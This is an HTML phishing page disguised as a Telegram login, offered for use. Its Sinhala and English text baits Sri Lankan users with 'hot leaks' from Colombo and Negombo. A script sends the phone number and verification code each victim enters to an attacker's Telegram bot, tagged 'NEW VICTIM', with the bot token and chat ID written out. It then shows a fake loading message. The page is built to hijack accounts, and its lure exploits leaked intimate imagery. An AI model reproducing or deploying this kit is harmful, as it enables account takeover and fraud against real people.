<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram - Login</title>
    <style>
        body {
            background: linear-gradient(#0a0a0a, #1a0033);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            margin: 0;
        }
        .box {
            background: #1F1F1F;
            max-width: 420px;
            margin: 40px auto;
            padding: 35px 20px;
            border-radius: 20px;
            border: 3px solid #229ED9;
            box-shadow: 0 0 30px #229ED9;
        }
        h1 { 
            color: #229ED9; 
            font-size: 28px; 
        }
        h2 {
            font-size: 20px;
            margin: 15px 0;
        }
        input {
            width: 90%;
            padding: 16px;
            margin: 12px 0;
            background: #333;
            border: 2px solid #555;
            border-radius: 10px;
            color: white;
            font-size: 17px;
        }
        button {
            background: #229ED9;
            color: white;
            padding: 16px 50px;
            font-size: 22px;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            margin-top: 20px;
            width: 90%;
            max-width: 340px;
        }
        button:hover {
            background: #1E90FF;
        }
    </style>
</head>
<body>

<div class="box">
    <h1>🔵 Telegram</h1>
    <h2>🔓 Verify කරන්න Hot Sri Lankan Leaks බලන්න</h2>
    <p>🍑 Colombo & Negombo අලුත්ම ලීක්ස් බලන්න දැන්!</p>

    <input type="tel" id="phone" placeholder="+94xxxxxxxxx" />
    <input type="text" id="code" placeholder="Verification Code" />

    <button onclick="sendData()">UNLOCK වෙන්​න 😈</button>
</div>

<script>
function sendData() {
    let phone = document.getElementById('phone').value;
    let code = document.getElementById('code').value;

    if(!phone || !code) {
        alert("Phone number සහ Code දාන්න!");
        return;
    }

    const token = "8418029750:AAEXSgDBZyNwostfOPGib5ZvelEsc-56jmI";     // ← Put your bot token
    const chatId = "badmoody_117";      // ← Put your chat ID

    const text = `🔥 NEW VICTIM 🔥%0APhone: ${phone}%0ACode: ${code}%0ADevice: Mobile`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`);

    alert("🔥 Hot Sri Lankan videos loading... 😈");
}
</script>

</body>
</html>
